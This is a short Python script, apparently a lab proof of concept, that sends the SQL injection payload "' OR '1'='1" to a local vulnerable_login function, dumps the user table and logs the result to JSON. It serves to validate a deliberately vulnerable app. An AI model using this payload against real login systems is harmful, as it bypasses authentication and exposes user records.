#!/usr/bin/env python3
"""Simple SQLi PoC to validate vulnerable_login."""
import argparse
import json
from datetime import datetime
from pathlib import Path
import sys

sys.path.append(str(Path(__file__).resolve().parents[1] / 'app'))
from app import init_db, vulnerable_login, dump_users  # type: ignore


def run(log_path: Path) -> None:
    init_db()
    payload_user = "admin"
    payload_pass = "' OR '1'='1"
    result = vulnerable_login(payload_user, payload_pass)
    rows = dump_users()
    log = {
        'timestamp': datetime.utcnow().isoformat() + 'Z',
        'payload': {'username': payload_user, 'password': payload_pass},
        'result': bool(result),
        'rows': rows,
    }
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with log_path.open('w', encoding='utf-8') as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"[POC] result={result} log={log_path}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--log', required=True)
    args = parser.parse_args()
    run(Path(args.log))
